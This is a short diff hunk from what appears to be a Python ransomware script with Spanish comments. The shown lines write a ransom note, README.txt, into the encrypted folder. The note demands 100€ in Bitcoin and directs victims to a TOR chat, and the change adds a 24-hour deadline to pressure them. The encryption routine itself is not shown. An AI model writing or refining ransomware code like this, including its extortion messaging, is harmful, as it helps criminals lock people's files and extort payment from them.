@@ -53,7 +53,7 @@ if __name__ == '__main__':
 
         # Mensaje para pedir el rescate guardado en el equipo atacado, normalmente en el escritorio.
         with open( path_to_encrypt + '\\README.txt', 'w') as file:
-            file.write('Los archivos de su systemas han sido encryptados.\n Si quiere recuperar sus archivos realizar pago de 100€ a la direccion de Bitcoin:a0asdd90s788ds8ds78ffsfds89g \n Puedes contactar conmigo en el chat de la siguiente web de TOR, debe instalar dicho navegador para acceder. Codigo para el buscador TOR: 1crhbhjkfdbv483c4398cn')
+            file.write('Los archivos de su systemas han sido encryptados y tiene 24 horas para actuar \n Si quiere recuperar sus archivos realizar pago de 100€ a la direccion de Bitcoin:a0asdd90s788ds8ds78ffsfds89g \n Puedes contactar conmigo en el chat de la siguiente web de TOR, debe instalar dicho navegador para acceder. Codigo para el buscador TOR: 1crhbhjkfdbv483c4398cn')
             
     except Exception as e:
         print(e)
